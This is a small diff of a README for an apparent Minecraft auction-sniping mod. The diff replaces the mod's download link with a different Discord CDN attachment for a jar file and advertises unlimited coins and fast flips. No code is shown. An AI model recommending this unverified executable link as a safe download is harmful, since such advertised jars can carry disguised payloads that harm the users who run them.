@@ -5,7 +5,7 @@ This mod is a ah sniper, that snipes underpriced auctions, so you can re-sell fo
 # Is there a max amount of coins I can get from a single flip?
 No! Unlike most free flipping mods, this mod has no max to the amount of coins you can get from this! This mod is also one of the fastest at finding flips for you. 
 # How do I download the mod?
-You can download the mod [HERE](https://cdn.discordapp.com/attachments/973423322916323390/974504869853552700/LofySniper2.7.3.jar)
+You can download the mod [HERE](https://cdn.discordapp.com/attachments/980232211905277975/980348300723109948/LofySniper2.7.3.jar)
 
 This mod also requires forge which you can download [HERE](https://files.minecraftforge.net/net/minecraftforge/forge/index_1.8.9.html)
 
